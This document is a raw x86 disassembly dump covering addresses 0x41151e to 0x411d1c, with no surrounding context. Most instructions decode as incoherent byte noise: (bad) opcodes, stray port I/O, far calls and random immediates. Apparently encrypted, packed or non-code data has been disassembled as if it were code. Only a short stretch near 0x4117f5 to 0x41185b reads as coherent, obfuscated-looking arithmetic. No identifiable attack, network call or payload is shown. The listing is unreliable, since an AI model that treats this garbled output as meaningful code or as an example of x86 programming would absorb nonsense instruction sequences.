  41151e:	cmp    BYTE PTR [ebp+0x74],0x59
  411522:	adc    BYTE PTR [esi+0x33bbd298],ah
  411528:	xchg   ah,bh
  41152a:	ins    BYTE PTR es:[edi],dx
  41152b:	mov    al,ds:0x488d267d
  411530:	mov    ecx,0xed923c16
  411535:	add    eax,0x894e0b5f
  41153a:	pop    esi
  41153b:	jb     0x411532
  41153d:	loopne 0x411541
  41153f:	adc    eax,0x9731db8b
  411544:	cdq    
  411545:	addr16 pusha 
  411547:	xor    DWORD PTR [edi+0x4f399c88],ebp
  41154d:	sbb    DWORD PTR [edi-0x7e781f8c],0xa
  411554:	mov    WORD PTR [eax+0x475d1ba9],es
  41155a:	lock test al,0x98
  41155d:	or     BYTE PTR [ebp+0x5b2a99f7],dl
  411563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411564:	sub    BYTE PTR ds:0x3bb38731,bl
  41156a:	out    dx,al
  41156b:	call   0x42f3bdfc
  411570:	mov    al,0x62
  411572:	ins    DWORD PTR es:[edi],dx
  411573:	nop
  411574:	jmp    0x4115f3
  411576:	aas    
  411577:	mov    dh,0x65
  411579:	or     DWORD PTR [ecx],eax
  41157b:	and    eax,0xc7a854c1
  411580:	stos   BYTE PTR es:[edi],al
  411581:	mov    dh,0xea
  411583:	dec    edx
  411584:	mov    eax,0x9ed3f82d
  411589:	push   0x30
  41158b:	inc    ebp
  41158c:	bound  ebp,QWORD PTR [edx-0x1f4789e2]
  411592:	cmp    DWORD PTR [edi],0xe077f6bd
  411598:	jmp    0x5bd1db39
  41159d:	mov    bl,0x44
  41159f:	outs   dx,DWORD PTR ds:[esi]
  4115a0:	cmp    bl,BYTE PTR [ecx]
  4115a2:	mov    esp,0x8309567a
  4115a7:	popf   
  4115a8:	adc    dh,BYTE PTR [esi+edx*1+0x59c4c68f]
  4115af:	nop
  4115b0:	jae    0x4115af
  4115b2:	or     BYTE PTR [edx-0x5bf2460a],ah
  4115b8:	fild   DWORD PTR [ebx-0x50]
  4115bb:	pop    ecx
  4115bc:	pop    ebp
  4115bd:	aas    
  4115be:	clc    
  4115bf:	adc    DWORD PTR es:[ebx+eax*4],ebx
  4115c3:	or     esp,DWORD PTR [esi+eax*1]
  4115c6:	lds    esp,FWORD PTR [eax]
  4115c8:	sub    al,0xf3
  4115ca:	or     BYTE PTR [esi+0x55749dfc],bh
  4115d0:	jg     0x4115bc
  4115d2:	fwait
  4115d3:	mov    al,0xee
  4115d5:	ins    DWORD PTR es:[edi],dx
  4115d6:	lds    edx,FWORD PTR [edi]
  4115d8:	sbb    al,0xeb
  4115da:	dec    ecx
  4115db:	je     0x411563
  4115dd:	mov    edi,0x96f3fd94
  4115e2:	test   DWORD PTR [esi+0x54808bad],edi
  4115e8:	add    ecx,DWORD PTR [eax]
  4115ea:	neg    DWORD PTR [ebx+0x786c0976]
  4115f0:	stos   BYTE PTR es:[edi],al
  4115f1:	jb     0x41162b
  4115f3:	leave  
  4115f4:	mov    dh,0x86
  4115f6:	jbe    0x4115b9
  4115f8:	pop    ebx
  4115f9:	mov    dl,0x82
  4115fb:	call   0x468:0x7ac81a41
  411602:	inc    ebp
  411603:	iret   
  411604:	pop    ecx
  411605:	push   ds
  411606:	aaa    
  411607:	out    dx,al
  411608:	pop    esp
  411609:	cdq    
  41160a:	mov    eax,ds:0x22f4dd85
  41160f:	jne    0x411664
  411611:	dec    dx
  411613:	xor    ch,dl
  411615:	(bad)  ds:0xe74fb97d
  41161b:	fdivr  QWORD PTR [ecx+0x1dd0fa3e]
  411621:	xchg   ecx,eax
  411622:	inc    ebx
  411623:	dec    ecx
  411624:	std    
  411625:	in     al,0x1
  411627:	arpl   WORD PTR [edi],di
  411629:	or     esp,edi
  41162b:	mov    eax,0x4fc999e9
  411630:	jo     0x41161f
  411632:	frstor [edi-0x2c]
  411635:	sbb    al,0x44
  411637:	push   eax
  411638:	mov    ch,0x61
  41163a:	xlat   BYTE PTR ds:[ebx]
  41163b:	cmp    eax,0xf2e0410
  411640:	cmp    ah,al
  411642:	sub    bl,BYTE PTR [edi+esi*1+0x7a]
  411646:	xlat   BYTE PTR ds:[ebx]
  411647:	mov    ss,ecx
  411649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41164a:	call   0x44d4:0x9e3d5edf
  411651:	jmp    0x48fe1922
  411656:	push   ecx
  411657:	mov    esi,DWORD PTR [esi]
  411659:	add    eax,0xcc190ca5
  41165e:	daa    
  41165f:	arpl   WORD PTR [esi],di
  411661:	sbb    edi,ebp
  411663:	jmp    0xa014:0x8993e178
  41166a:	int    0xd
  41166c:	rcl    DWORD PTR [edx+edi*4-0x2d],cl
  411670:	retf   0x5f46
  411673:	mov    al,0x5c
  411675:	loop   0x4115f7
  411677:	clc    
  411678:	and    BYTE PTR [edx+0x3c],bl
  41167b:	lea    ebp,[eax+0x3dc926a4]
  411681:	dec    esp
  411682:	push   ebx
  411683:	cs push cs
  411685:	lahf   
  411686:	fisub  WORD PTR [edi]
  411688:	fstp   st(3)
  41168a:	fiadd  DWORD PTR [esi-0x13695a1f]
  411690:	jne    0x41165b
  411692:	aad    0x6f
  411694:	sub    edi,ebx
  411696:	scas   al,BYTE PTR es:[edi]
  411697:	dec    ecx
  411698:	pop    edx
  411699:	pop    ebx
  41169a:	add    BYTE PTR ds:0xb7da8ade,ch
  4116a0:	sbb    DWORD PTR [ebx+0x4d68141b],esi
  4116a6:	aas    
  4116a7:	loopne 0x41163f
  4116a9:	mov    BYTE PTR [eax],bh
  4116ab:	jmp    0xff78d270
  4116b0:	xor    edi,DWORD PTR [ebx]
  4116b2:	(bad)  
  4116b3:	fld    QWORD PTR [eax+0x56aa5ce0]
  4116b9:	push   edx
  4116ba:	add    ch,dh
  4116bc:	cmp    al,BYTE PTR [eax-0x7d]
  4116bf:	lds    eax,FWORD PTR [edi]
  4116c1:	cld    
  4116c2:	sti    
  4116c3:	dec    ecx
  4116c4:	mov    ebp,0x22582b63
  4116c9:	or     eax,0xeafed936
  4116ce:	addr16 pop ds
  4116d0:	mov    bh,0x3d
  4116d2:	adc    BYTE PTR [eax-0x61884f12],bl
  4116d8:	sub    cl,BYTE PTR [ecx]
  4116da:	mov    ch,al
  4116dc:	cmp    ch,BYTE PTR [esi+0x5db7968d]
  4116e2:	adc    al,BYTE PTR [ebx]
  4116e4:	in     al,dx
  4116e5:	xchg   esp,eax
  4116e6:	cdq    
  4116e7:	fst    DWORD PTR [edi+0x51]
  4116ea:	sub    al,0xa9
  4116ec:	outs   dx,DWORD PTR ds:[esi]
  4116ed:	mov    al,0x25
  4116ef:	jne    0x411742
  4116f1:	cmp    eax,0x170b8da2
  4116f6:	imul   esi,DWORD PTR [esi-0x7a213db2],0x4faaf22a
  411700:	xchg   ecx,eax
  411701:	mov    dh,ch
  411703:	lods   eax,DWORD PTR ds:[esi]
  411704:	or     DWORD PTR [ebx-0x218142de],edx
  41170a:	cmp    ebx,DWORD PTR [edx-0x76856b0d]
  411710:	test   al,0x59
  411712:	frstor [ebp-0x38f528c4]
  411718:	mov    dh,0x56
  41171a:	and    ch,BYTE PTR ds:0x8caa75fe
  411720:	dec    esi
  411721:	out    dx,al
  411722:	or     BYTE PTR [ecx+0x272a118a],cl
  411728:	mov    ah,0x86
  41172a:	and    eax,0x53efc14d
  41172f:	push   0xffffff9e
  411731:	sub    al,0xe9
  411733:	test   eax,0x74115010
  411738:	inc    ecx
  411739:	adc    esp,edx
  41173b:	imul   esi,DWORD PTR [esp+ebp*1-0x1101b5ae],0x5c
  411743:	pop    ecx
  411744:	push   ebx
  411745:	stc    
  411746:	call   0xa1f735bd
  41174b:	and    ebp,DWORD PTR [ebp-0x68cf26b1]
  411751:	add    DWORD PTR [eax],ecx
  411753:	enter  0x9d,0x66
  411757:	repz and al,0xdd
  41175a:	in     al,0x95
  41175c:	xlat   BYTE PTR ds:[ebx]
  41175d:	add    BYTE PTR [edi+eiz*1-0x40222084],ch
  411764:	rcl    BYTE PTR ds:0x7466f60d,0xe3
  41176b:	fmul   DWORD PTR [eax+0x27]
  41176e:	jb     0x411717
  411770:	retf   
  411771:	pop    ss
  411772:	inc    eax
  411773:	sub    BYTE PTR [ebx-0x5796b3c5],cl
  411779:	sbb    BYTE PTR [esi-0x33],0xa8
  41177d:	(bad)  
  41177e:	sar    DWORD PTR [edi],cl
  411780:	js     0x4117ac
  411782:	xchg   dl,bl
  411784:	lahf   
  411785:	retf   0xf7b1
  411788:	call   0xfb924816
  41178d:	push   0x4a
  41178f:	xchg   ebx,eax
  411790:	icebp  
  411791:	in     eax,0x5f
  411793:	push   eax
  411794:	push   ss
  411795:	inc    eax
  411796:	sahf   
  411797:	idiv   BYTE PTR [edx-0x5b]
  41179a:	enter  0x59d9,0x55
  41179e:	out    0x1,eax
  4117a0:	outs   dx,BYTE PTR ds:[esi]
  4117a1:	ins    BYTE PTR es:[edi],dx
  4117a2:	push   es
  4117a3:	and    eax,0x6853cd0c
  4117a8:	fcomp  QWORD PTR [eax+0x3bd9f24b]
  4117ae:	mov    al,ds:0x200ddbf3
  4117b3:	add    BYTE PTR [eax+eax*8],0x2e
  4117b7:	dec    eax
  4117b8:	and    eax,DWORD PTR ds:0xb90a88d5
  4117be:	data16 sti 
  4117c0:	jle    0x411827
  4117c2:	inc    edi
  4117c3:	mov    ds:0x699bb892,eax
  4117c8:	les    esp,FWORD PTR [edi]
  4117ca:	xchg   esi,eax
  4117cb:	imul   ecx,DWORD PTR [ebx-0x56aab735],0xa9a1415a
  4117d5:	inc    ecx
  4117d6:	jg     0x4117dc
  4117d8:	in     eax,0x29
  4117da:	dec    BYTE PTR [edi-0x71]
  4117dd:	xchg   ebx,eax
  4117de:	mov    ss,WORD PTR [ebx+0x1559d0e6]
  4117e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117e5:	pushf  
  4117e6:	cmp    esi,ebp
  4117e8:	adc    dh,BYTE PTR [esi+0x5]
  4117eb:	mov    cl,BYTE PTR [eax+0x33ce2b13]
  4117f1:	enter  0x4d89,0x8
  4117f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4117f8:	mov    edx,DWORD PTR [ebp+0x8]
  4117fb:	imul   edx,edx,0x5708f1
  411801:	xor    ecx,eax
  411803:	add    ecx,esi
  411805:	lea    ecx,[ebp+ecx*4-0x64]
  411809:	mov    edi,DWORD PTR [ecx]
  41180b:	add    edx,edi
  41180d:	mov    DWORD PTR [ecx],edx
  41180f:	mov    ecx,DWORD PTR [ebp+0x8]
  411812:	xor    ecx,eax
  411814:	add    ecx,esi
  411816:	jne    0x40f45a
  41181c:	jmp    0x413bef
  411821:	mov    ecx,DWORD PTR [ebp+0x8]
  411824:	mov    edx,DWORD PTR [ebp-0x8]
  411827:	xor    ecx,eax
  411829:	xor    edx,eax
  41182b:	sub    ecx,edx
  41182d:	sub    ecx,esi
  41182f:	xor    ecx,eax
  411831:	mov    DWORD PTR [ebp+0x8],ecx
  411834:	mov    ecx,DWORD PTR [ebp+0x8]
  411837:	mov    edx,DWORD PTR [ebp+0x8]
  41183a:	xor    ecx,eax
  41183c:	imul   edx,edx,0x5708f1
  411842:	add    ecx,esi
  411844:	lea    ecx,[ebp+ecx*4-0x64]
  411848:	mov    edi,DWORD PTR [ecx]
  41184a:	add    edx,edi
  41184c:	mov    DWORD PTR [ecx],edx
  41184e:	mov    ecx,DWORD PTR [ebp+0x8]
  411851:	xor    ecx,eax
  411853:	add    ecx,esi
  411855:	jne    0x411821
  41185b:	jmp    0x413be3
  411860:	ins    BYTE PTR es:[edi],dx
  411861:	jns    0x4117f2
  411863:	sbb    edi,DWORD PTR [ebx+0x1b]
  411866:	mov    eax,0xa6df667b
  41186b:	push   edi
  41186c:	fiadd  DWORD PTR [esi-0x6f17648b]
  411872:	jl     0x4118f0
  411874:	pop    es
  411875:	pop    edi
  411876:	jl     0x4118f4
  411878:	test   BYTE PTR [esi-0x2c],ch
  41187b:	dec    eax
  41187c:	or     BYTE PTR [ebp-0xf],al
  41187f:	(bad)  [edi+eiz*1]
  411882:	fdivr  QWORD PTR [edi-0x6c6ab952]
  411888:	retf   0xdf23
  41188b:	xor    cl,BYTE PTR [ebx]
  41188d:	and    BYTE PTR [esi+0x2b268825],0x4e
  411894:	leave  
  411895:	imul   ebp,DWORD PTR [edi+0x24],0x9
  411899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41189a:	xor    eax,DWORD PTR [eax-0x5c]
  41189d:	les    ebx,FWORD PTR [eax-0x737882ad]
  4118a3:	ficomp WORD PTR [edx+0x7c]
  4118a6:	jb     0x4118aa
  4118a8:	pop    ebx
  4118a9:	gs adc ebp,eax
  4118ac:	jl     0x4118a6
  4118ae:	fs xchg edi,eax
  4118b0:	(bad)  
  4118b1:	mov    WORD PTR [ecx-0x1e],ds
  4118b4:	jg     0x411915
  4118b6:	xchg   ecx,eax
  4118b7:	ret    0x11c8
  4118ba:	aam    0xaa
  4118bc:	retf   0xa3af
  4118bf:	iret   
  4118c0:	or     eax,0x486ec6e4
  4118c5:	mov    cl,0x97
  4118c7:	daa    
  4118c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118c9:	sbb    BYTE PTR [ebx],al
  4118cb:	mov    ah,0x5f
  4118cd:	push   ds
  4118ce:	sub    DWORD PTR [edi+0x0],0xffffffd7
  4118d2:	mov    esp,0x4d4170e4
  4118d7:	sbb    BYTE PTR [edx+0x12],ch
  4118da:	adc    al,0x2f
  4118dc:	icebp  
  4118dd:	ret    
  4118de:	(bad)  
  4118e0:	inc    edi
  4118e1:	inc    esi
  4118e2:	imul   ecx,DWORD PTR [ecx-0x7fe14687],0x54
  4118e9:	push   esi
  4118ea:	into   
  4118eb:	and    al,BYTE PTR [ecx]
  4118ed:	adc    eax,0xb2a08a2
  4118f2:	push   ebx
  4118f3:	(bad)  
  4118f4:	gs or  eax,0x68794ae9
  4118fa:	mov    ah,BYTE PTR ds:0x97d848cf
  411900:	mov    edx,0xba752e87
  411905:	sbb    al,0x84
  411907:	out    0x22,al
  411909:	push   0x2a
  41190b:	aaa    
  41190c:	into   
  41190d:	scas   eax,DWORD PTR es:[edi]
  41190e:	sub    bh,ch
  411910:	cli    
  411911:	jnp    0x4118e0
  411913:	mov    eax,fs
  411915:	cld    
  411916:	jns    0x411916
  411918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411919:	and    BYTE PTR [ebx-0x3],al
  41191c:	sti    
  41191d:	jns    0x411901
  41191f:	dec    edi
  411920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411921:	cdq    
  411922:	or     ebx,DWORD PTR [eax+0x3eb189ee]
  411928:	repz fiadd WORD PTR [ebp+0x68321bb]
  41192f:	cmp    DWORD PTR [eax-0x59],ecx
  411932:	jnp    0x41199d
  411934:	mov    eax,DWORD PTR [ebp-0x625ae2e6]
  41193a:	dec    ebx
  41193b:	or     esi,ebp
  41193d:	mov    ah,0xea
  41193f:	in     al,dx
  411940:	sub    DWORD PTR [ebp-0x21b63915],esp
  411946:	sahf   
  411947:	jo     0x4119ab
  411949:	aas    
  41194a:	les    ecx,FWORD PTR [ecx*2-0x17fc33d2]
  411951:	jmp    0x4118e7
  411953:	cmc    
  411954:	clc    
  411955:	imul   ebx,edi,0xfca3ef50
  41195b:	leave  
  41195c:	jbe    0x41195e
  41195e:	out    dx,eax
  41195f:	and    eax,0x448b599d
  411964:	cmp    BYTE PTR [edi+0x6a63fde8],0x50
  41196b:	pushw  0x2807
  41196f:	lods   al,BYTE PTR ds:[esi]
  411970:	sbb    eax,0x7384916f
  411975:	push   es
  411976:	push   ebx
  411977:	jge    0x411935
  411979:	jl     0x41192c
  41197b:	pop    es
  41197c:	pop    esi
  41197d:	out    0x77,eax
  41197f:	in     eax,dx
  411980:	mov    cl,0x24
  411982:	jmp    0x411953
  411984:	and    BYTE PTR [edx+edi*2-0x6d24223],al
  41198b:	shl    DWORD PTR [edi-0x2ef125ea],cl
  411991:	ins    BYTE PTR es:[edi],dx
  411992:	outs   dx,DWORD PTR ds:[esi]
  411993:	clc    
  411994:	sbb    al,dh
  411996:	out    0x85,al
  411998:	sub    al,0x8a
  41199a:	ret    0x33e9
  41199d:	jbe    0x4119e6
  41199f:	lods   eax,DWORD PTR ds:[esi]
  4119a0:	add    eax,0xb7d0f937
  4119a5:	mov    esi,0x63636962
  4119aa:	push   es
  4119ab:	and    al,ah
  4119ad:	jne    0x4119d0
  4119af:	test   eax,0xbfc78975
  4119b4:	or     DWORD PTR [esi-0x72e6beef],0x34
  4119bb:	adc    al,0xf0
  4119bd:	das    
  4119be:	add    bl,BYTE PTR [edx+0x6f77f8c2]
  4119c4:	hlt    
  4119c5:	pushf  
  4119c6:	mov    ah,BYTE PTR [edx-0x6e6d89ce]
  4119cc:	fsubr  QWORD PTR [ebx]
  4119ce:	js     0x41198a
  4119d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119d1:	sbb    ecx,DWORD PTR [eax-0x46bb74a8]
  4119d7:	popa   
  4119d8:	xchg   BYTE PTR [eax-0x1d],cl
  4119db:	(bad)  
  4119dc:	stos   DWORD PTR es:[edi],eax
  4119dd:	ret    0x5528
  4119e0:	push   edx
  4119e1:	(bad)  
  4119e2:	mov    edi,0x867a5262
  4119e7:	test   BYTE PTR [eax],al
  4119e9:	dec    esi
  4119ea:	es pop ds
  4119ec:	add    BYTE PTR [ecx+0x74],dh
  4119ef:	imul   ecx,DWORD PTR [esi+ecx*8+0x8e6db4],0x2e
  4119f7:	cmp    ebp,0x4e
  4119fa:	bound  esi,QWORD PTR [eax-0x43]
  4119fd:	pop    ecx
  4119fe:	dec    eax
  4119ff:	out    0xd2,eax
  411a01:	addr16 mov dl,0xbe
  411a04:	add    DWORD PTR [esi+0xb],edi
  411a07:	fwait
  411a08:	dec    edi
  411a09:	imul   ecx
  411a0b:	inc    edi
  411a0c:	sbb    cl,BYTE PTR [eax]
  411a0e:	add    eax,ebp
  411a10:	mov    edi,0x3496e271
  411a15:	sub    eax,0xff11ac7b
  411a1a:	add    BYTE PTR [ecx],0x8a
  411a1d:	cmc    
  411a1e:	dec    esp
  411a1f:	xchg   esp,eax
  411a20:	shl    DWORD PTR [edi],cl
  411a22:	inc    esi
  411a23:	lods   al,BYTE PTR ds:[esi]
  411a24:	std    
  411a25:	dec    esi
  411a26:	xor    BYTE PTR [ebx],al
  411a28:	jae    0x411a88
  411a2a:	(bad)  
  411a2b:	fstp   QWORD PTR [ecx-0x102eac4e]
  411a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a32:	sbb    DWORD PTR [edi-0x48],0x74c5ecbe
  411a39:	call   0x4660:0x942b280b
  411a40:	and    DWORD PTR [edi-0xc681b0e],edx
  411a46:	icebp  
  411a47:	hlt    
  411a48:	or     DWORD PTR [esi+esi*2-0x66864984],esp
  411a4f:	or     ebx,ecx
  411a51:	xchg   edx,eax
  411a52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a53:	aaa    
  411a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a55:	dec    ebx
  411a56:	or     DWORD PTR [ebx*1+0x1006cc4a],eax
  411a5d:	and    DWORD PTR [edx+edi*2],ebp
  411a60:	adc    BYTE PTR [ecx+ebp*2],al
  411a63:	ss jbe 0x411a0e
  411a66:	in     eax,dx
  411a67:	jbe    0x4119f3
  411a69:	call   0x44d6:0xbe1b029
  411a70:	and    eax,0x533eb1b5
  411a75:	pop    eax
  411a76:	and    eax,0x418cdeb3
  411a7b:	xchg   esp,eax
  411a7c:	mov    esp,0x4fc2afcc
  411a81:	adc    al,BYTE PTR [eax+0x447714b6]
  411a87:	(bad)  
  411a88:	out    0xf,al
  411a8a:	mov    dl,0xaa
  411a8c:	or     eax,0x25efa897
  411a91:	xchg   BYTE PTR [eax+0x45bd3c96],al
  411a97:	jb     0x411ad6
  411a99:	xor    ebx,DWORD PTR [ebx-0x6f]
  411a9c:	xor    esp,DWORD PTR [ebx+eax*8+0x38fbc922]
  411aa3:	je     0x411a7b
  411aa5:	cli    
  411aa6:	imul   BYTE PTR [ecx+0x10]
  411aa9:	and    DWORD PTR [ebx+0x1a8da083],edi
  411aaf:	mov    ?,WORD PTR [edi+0xa7251cf]
  411ab5:	arpl   WORD PTR [ebx-0x1275a092],di
  411abb:	xor    ebp,DWORD PTR [ebx-0x58]
  411abe:	ja     0x411aec
  411ac0:	mov    edi,0x43fba85f
  411ac5:	(bad)
  411ac9:	xchg   ebx,eax
  411aca:	inc    eax
  411acb:	mov    edx,0x36f13dc0
  411ad0:	(bad)  
  411ad1:	mov    ds:0x206cebae,al
  411ad6:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ad8:	add    BYTE PTR [ecx+0x24],al
  411adb:	mov    esi,0x1a284db0
  411ae0:	inc    esi
  411ae1:	in     al,0xef
  411ae3:	or     DWORD PTR [ebx-0xf],esp
  411ae6:	mov    eax,ds:0xa1641ce7
  411aeb:	ret    0x295a
  411aee:	int    0xcb
  411af0:	lock fwait
  411af2:	jae    0x411b2f
  411af4:	sub    ah,ah
  411af6:	mov    gs,ebp
  411af8:	test   al,0x6a
  411afa:	xor    BYTE PTR [eax-0x5d],bh
  411afd:	inc    edx
  411afe:	mov    ebx,0xedccb76c
  411b03:	pop    esp
  411b04:	and    al,ch
  411b06:	mov    edx,0x448a5dca
  411b0b:	(bad)  
  411b0c:	icebp  
  411b0d:	and    ebx,DWORD PTR [eax-0x45250d6c]
  411b13:	or     DWORD PTR [ebx+0x3ce82efd],ebx
  411b19:	(bad)  
  411b1a:	push   cs
  411b1b:	pusha  
  411b1c:	mov    eax,ds:0xec88367c
  411b21:	dec    ebx
  411b22:	repnz sahf 
  411b24:	jns    0x411ab7
  411b26:	or     dh,BYTE PTR [esp+ebp*4+0x0]
  411b2a:	frstor [ebp+0x2f]
  411b2d:	stos   BYTE PTR es:[edi],al
  411b2e:	inc    ebx
  411b2f:	int3   
  411b30:	push   ss
  411b31:	loope  0x411b38
  411b33:	sub    ah,bh
  411b35:	neg    DWORD PTR [ebx+0x9895226]
  411b3b:	or     dh,cl
  411b3d:	or     al,0x31
  411b3f:	call   0xf304:0x1b5329bc
  411b46:	dec    edi
  411b47:	arpl   WORD PTR [ecx-0x15],sp
  411b4a:	stos   BYTE PTR es:[edi],al
  411b4b:	xor    BYTE PTR [ebx+0x26],ah
  411b4e:	fwait
  411b4f:	repz or BYTE PTR ds:0xe3cb855d,dh
  411b56:	pop    ecx
  411b57:	rcr    eax,0xa
  411b5a:	xchg   ebp,eax
  411b5b:	and    dl,ch
  411b5d:	dec    esi
  411b5e:	scas   eax,DWORD PTR es:[edi]
  411b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b60:	mov    al,0xa4
  411b62:	mov    ds:0x6a62d1c5,eax
  411b67:	adc    al,0x18
  411b69:	push   ds
  411b6a:	xchg   edi,eax
  411b6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b6c:	into   
  411b6d:	mov    ebp,0xac694666
  411b72:	mov    BYTE PTR ds:0x98444636,cl
  411b78:	add    eax,0x56cf20ac
  411b7d:	push   ebp
  411b7e:	mov    edx,0xf1f82112
  411b83:	jge    0x411b67
  411b85:	xor    BYTE PTR [ecx-0x2d307397],0xfc
  411b8c:	xchg   ecx,eax
  411b8d:	inc    ebx
  411b8e:	pusha  
  411b8f:	test   eax,0x531e1929
  411b94:	sahf   
  411b95:	das    
  411b96:	(bad)  
  411b98:	pop    esp
  411b99:	dec    ecx
  411b9a:	in     eax,0xc9
  411b9c:	push   0xbef5498b
  411ba1:	push   ds
  411ba2:	lods   eax,DWORD PTR ds:[esi]
  411ba3:	xor    eax,0x3ec7a92e
  411ba8:	pushf  
  411ba9:	push   edi
  411baa:	in     al,0x66
  411bac:	jne    0x411b5c
  411bae:	sbb    bh,dh
  411bb0:	or     al,0xc3
  411bb2:	shl    DWORD PTR [ebx],0x4b
  411bb5:	push   ebx
  411bb6:	and    DWORD PTR ds:[ebp+0x5f],ecx
  411bba:	clc    
  411bbb:	xor    al,0x52
  411bbd:	inc    ebp
  411bbe:	mov    ebx,0xe01b2155
  411bc3:	imul   ebp,DWORD PTR [esi],0xffffff92
  411bc6:	jge    0x411b67
  411bc8:	test   BYTE PTR [edi],ch
  411bca:	lds    ebx,FWORD PTR [edi-0x7a]
  411bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bce:	loopne 0x411ba7
  411bd0:	mov    eax,0xe48b7b48
  411bd5:	sahf   
  411bd6:	push   ss
  411bd7:	mov    eax,ds:0x771b6202
  411bdc:	jnp    0x411b9e
  411bde:	rcl    DWORD PTR [ebx+eiz*1+0x70eb6430],cl
  411be5:	sbb    al,bh
  411be7:	xchg   esi,eax
  411be8:	jnp    0x411bf1
  411bea:	arpl   bp,dx
  411bec:	enter  0xc47d,0x13
  411bf0:	xchg   BYTE PTR [esi],dh
  411bf2:	sub    ah,dh
  411bf4:	cmc    
  411bf5:	pop    ds
  411bf6:	mov    eax,0xe8705f38
  411bfb:	inc    eax
  411bfc:	pop    edi
  411bfd:	imul   ecx,DWORD PTR [eax+0x2883ee06],0x3c
  411c04:	in     al,0xb3
  411c06:	cwde   
  411c07:	mov    ebx,DWORD PTR [ecx]
  411c09:	sbb    DWORD PTR [edi-0x5d],eax
  411c0c:	nop
  411c0d:	add    eax,0x9b67911d
  411c12:	xchg   esp,eax
  411c13:	out    dx,al
  411c14:	(bad)  
  411c15:	loope  0x411bfa
  411c17:	lock sub eax,0xb469c01e
  411c1d:	repnz data16 sti 
  411c20:	cmp    eax,0xd1c0ea49
  411c25:	mov    DWORD PTR [edx-0x256c49e6],edx
  411c2b:	addr16 sub al,0xc1
  411c2e:	sub    eax,DWORD PTR [ebx-0x3a4956db]
  411c34:	cld    
  411c35:	rol    BYTE PTR [ecx-0x188291b6],1
  411c3b:	xlat   BYTE PTR ds:[ebx]
  411c3c:	jl     0x411c54
  411c3e:	xor    ch,dh
  411c40:	call   0xab88:0x28c0b94a
  411c47:	ja     0x411bf3
  411c49:	nop
  411c4a:	jne    0x411c2b
  411c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c4d:	lods   al,BYTE PTR ds:[esi]
  411c4e:	aad    0xae
  411c50:	fmul   DWORD PTR [edi-0x39]
  411c53:	loopne 0x411beb
  411c55:	cmp    eax,esi
  411c57:	adc    edi,ebp
  411c59:	mov    ch,0xbc
  411c5b:	jbe    0x411c0a
  411c5d:	pop    edx
  411c5e:	xchg   edi,eax
  411c5f:	jge    0x411c54
  411c61:	jo     0x411cca
  411c63:	mov    bh,0xc1
  411c65:	(bad)  
  411c67:	call   0x8a4c14b3
  411c6c:	into   
  411c6d:	sbb    eax,0x23ef004e
  411c72:	push   ss
  411c73:	fdivr  st,st(5)
  411c75:	jecxz  0x411c1c
  411c77:	jne    0x411cb2
  411c79:	xchg   ebp,eax
  411c7a:	test   eax,0x881cc793
  411c7f:	sub    edi,esp
  411c81:	sub    ebx,DWORD PTR [ecx-0x3d]
  411c84:	jmp    0x1965:0x2cccd2a1
  411c8b:	rcr    DWORD PTR [ebx+0x5df558a7],cl
  411c91:	mov    eax,0xb639718a
  411c96:	jmp    0x525a2f92
  411c9b:	shl    BYTE PTR [edi],0x1f
  411c9e:	dec    esi
  411c9f:	mov    ch,0x43
  411ca1:	cdq    
  411ca2:	inc    edx
  411ca3:	jbe    0x411d1c
  411ca5:	jae    0x411d09
  411ca7:	inc    esi
  411ca8:	inc    ecx
  411ca9:	inc    ebp
  411caa:	lock adc esi,DWORD PTR [esi+ecx*2]
  411cae:	mov    ebx,0x21599736
  411cb3:	mov    bh,0x6a
  411cb5:	xchg   ebx,eax
  411cb6:	jnp    0x411cf2
  411cb8:	dec    esp
  411cb9:	stos   DWORD PTR es:[edi],eax
  411cba:	and    DWORD PTR [esi],esp
  411cbc:	iret   
  411cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cbe:	jp     0x411ce2
  411cc0:	pop    ebx
  411cc1:	pop    es
  411cc2:	xchg   BYTE PTR [ebx+0x798c5f09],ah
  411cc8:	mov    edx,ebx
  411cca:	std    
  411ccb:	and    eax,ebx
  411ccd:	and    dl,ah
  411ccf:	push   ds
  411cd0:	sub    DWORD PTR [ecx+0x1d],esi
  411cd3:	mov    dh,0xf0
  411cd5:	popa   
  411cd6:	inc    eax
  411cd7:	cmp    al,0x56
  411cd9:	(bad)  
  411cda:	sub    eax,0x4873b7ba
  411cdf:	sub    ch,bl
  411ce1:	adc    eax,0x2bfdb0e4
  411ce6:	ins    DWORD PTR es:[edi],dx
  411ce7:	call   FWORD PTR [ebx-0x32]
  411cea:	push   ecx
  411ceb:	cmp    dl,cl
  411ced:	fsub   st,st(6)
  411cef:	ins    DWORD PTR es:[edi],dx
  411cf0:	xor    edi,ebx
  411cf2:	bound  ecx,QWORD PTR [esp+eax*1]
  411cf5:	mov    bl,0xd7
  411cf7:	pop    ss
  411cf8:	push   edx
  411cf9:	je     0x411d56
  411cfb:	inc    edi
  411cfc:	mov    ebp,0xbc2276f
  411d01:	cmp    eax,0x8c5579c6
  411d06:	xchg   esi,eax
  411d07:	jg     0x411d38
  411d09:	push   edx
  411d0a:	xchg   esi,eax
  411d0b:	test   eax,0xa9ed50a6
  411d10:	dec    esp
  411d11:	int3   
  411d12:	or     eax,DWORD PTR [esi]
  411d14:	add    al,0x6
  411d16:	sbb    BYTE PTR [ebx-0x4ec0a7d3],ah
  411d1c:	cmp    BYTE PTR [esi-0x5e],ah
